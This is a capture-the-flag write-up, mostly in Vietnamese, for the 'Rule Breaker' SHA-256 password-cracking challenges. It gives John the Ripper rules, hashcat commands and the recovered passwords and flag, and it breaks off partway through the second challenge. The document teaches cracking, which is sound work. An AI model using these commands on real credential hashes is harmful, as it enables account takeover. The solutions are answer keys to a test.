>I hashed 3 more of my most secret passwords with SHA256. To make the passwords even more unbreakable, I mutated each one according to the following rules: <br>
Password 1: Append 3 characters at the end, in the following order: a special character, a number, and an uppercase letter<br>
Password 2: A typo was made when typing the password. Consider a typo to mean a single-character deletion from the password<br>
Password 3: Make the password leet (and since I'm nice, I'll tell you a hint: only vowels are leetified!)<br>
I'm confident you'll never be able to crack my hashes now! Do your worst!
```5e09f66ae5c6b2f4038eba26dc8e22d8aeb54f624d1d3ed96551e900dac7cf0d``` ```fb58c041b0059e8424ff1f8d2771fca9ab0f5dcdd10c48e7a67a9467aa8ebfa8``` ```4ac53d04443e6786752ac78e2dc86f60a629e4639edacc6a5937146f3eacc30f```<br>
Use the rockyou.txt wordlist.<br>
Flag format: L3AK{pass1_pass2_pass3}


Chúng ta có thể dùng ```John The Ripper``` hoặc ```hashcat``` kết hợp với ```rule``` để tấn công từ điển bẻ khóa mã băm

1. ***Password 1***

Sử dụng ```John``` kết hợp với ```rule``` cấu hình ở ```/etc/john/john.conf```

```
[List.Rules:Custom3Char]
Az"[!@#$%^&*]" Az"[0-9]" Az"[A-Z]"
```
```Az``` là thêm vào cuối lần lượt kí tự đặc biệt, số, và chữ cái viết hóa

```
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt --rules=Custom3Char hash1.txt
```
```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hyepsi^4B        (?)
1g 0:00:15:41 DONE (2025-07-16 15:42) 0.001062g/s 21423Kp/s 21423Kc/s 21423KC/s idntlyku^4B..hsclj01^4B
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

Ngoài ra có thể dùng ```hashcat``` ở chế độ ```6``` ```Dictionary + mask (append mask vào từ wordlist)```

```
hashcat -a 6 -m 1400 hash1.txt /usr/share/wordlists/rockyou.txt "?s?d?u"
```

2. ***Password 2***

Tương tự sử dụng ```john``` với ```rule``` ```jumbo``` đã được thiết lập sẵn

```
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt --rules=jumbo hash2.txt
```
```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thecowsaysmo     (?)
1g 0:00:06:10 DONE (2025-07-16 16:03) 0.002695g/s 12101Kp/s 12101Kc/s 12101KC/s harryismydo..angel0210204
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

3. ***Password 3***

Sử dụng ```john``` với ```rule``` tự định nghĩa như sau

```
[List.Rules:leetfull]
sa@sc<se3si1so0ss$
```
rule ```sa@``` tức là thay thế ```a``` thành ```@```...

```
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt --rules=leetfull hash3.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
unf0rg1v@bl3     (?)
1g 0:00:00:00 DONE (2025-07-16 18:17) 1.724g/s 2146Kp/s 2146Kc/s 2146KC/s v1rg042..$w33tt45
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

Hoặc sử dụng ```hashcat``` với ```rule``` [Đây](https://github.com/hashcat/hashcat/blob/master/rules/leetspeak.rule)

```
hashcat -a 0 -m 1400 hash3.txt /usr/share/wordlists/rockyou.txt -r leetspeak.rule
```

```flag: L3AK{hyepsi^4B_thecowsaysmo_unf0rg1v@bl3}```


## Rule Breaker 2
>If you thought rules were easy after the last challenge, think again! I've concocted more devious password mangling rules to push the limits of your cracking knowledge (and possibly your CPU...):<br>
Password 1: Prepend 1 uppercase letter, Swap the first 2 characters, Rotate it to the right 3 times, Append a 4-digit year since 1900.<br>
Password 2: Lowercase the entire password. Apply a random caesar cipher shift to all the letters in the password. Then, replace each alphanumeric character with its right neighbor on the QWERTY keyboard. Finally, reverse it.<br>
Password 3: Split the password in half, toggle the case of every consonant in the first half, randomly toggle the case of all vowels in the second half, then interleave the halves together. Assume password has an even length and is no more than 14 characters. The letter Y is considered a vowel for the purposes of this challenge.<br>
2a07038481b64a934495e5a91d011ecbf278aba8c5263841e1d13f73975d5397 cd6e58d947e2f7ace23cb6d602daa1ae46934c3c1f4800bfd25e6af2b555f6f5 84b9e0298b1beb5236b7fcd2dd67e67abf62d16fe6d591024178790238cb4453<br>
Use the rockyou.txt wordlist.<br>
Flag format: L3AK{pass1_pass2_pass3}

1. ***password 1***

Tài liệu tham khảo từ [click to read](https://www.openwall.com/john/doc/RULES.shtml)

```
^X	    prefix the word with character X
}	    rotate the word right: "smithj" -> "jsmith"
DN	    delete the character in position N
XNMI	extract substring NM from memory and insert into current word at I
```
Tạo quy tắc tùy chỉnh bằng cách sử dụng john:

```
[List.Rules:custom_challenge1]
^[A-Z]X010D2}}}
```

```
^[A-Z]  -> "Prepend 1 uppercase letter"
X010D2  -> "Swap the first 2 characters`
}}}     -> "Rotate it to the right 3 times"
```
Viết danh sách từ mới với --stdout
```
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=custom_challenge1 --stdout > rockyou2.txt
```
Sau đó sử dụng chế độ kết hợp với hashcat để thêm mặt nạ (-a 6) ("Thêm năm có 4 chữ số kể từ năm 1900.")

```
hashcat -m 1400 -a 6 "2a07038481b64a934495e5a91d011ecbf278aba8c5263841e1d13f73975d5397" rockyou2.txt "19?d?d"

2a07038481b64a934495e5a91d011ecbf278aba8c5263841e1d13f73975d5397:er!bLigbroth1984
```